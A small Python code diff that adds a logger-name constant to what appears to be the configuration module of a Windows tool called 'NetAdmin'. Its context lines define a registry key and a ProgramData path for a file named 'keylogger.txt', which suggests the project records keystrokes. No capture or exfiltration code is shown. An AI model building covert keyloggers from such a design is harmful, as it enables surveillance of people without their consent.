@@ -2,6 +2,7 @@ import os
 import winreg
 from os import path
 
+loggerName = "mainlogger"
 REGISTRY_KEY_PATH = (winreg.HKEY_CURRENT_USER, "SOFTWARE\\NetAdmin\\Configuration") # (key, sub_key)
 PROGRAMDATA_NETADMIN_PATH = os.path.join(os.getenv('ALLUSERSPROFILE'), "NetAdmin\\") #in programdata
 KEYLOGGER_FILE_PATH = os.path.join(os.getenv('ALLUSERSPROFILE'), "NetAdmin\\keylogger.txt") #in programdata
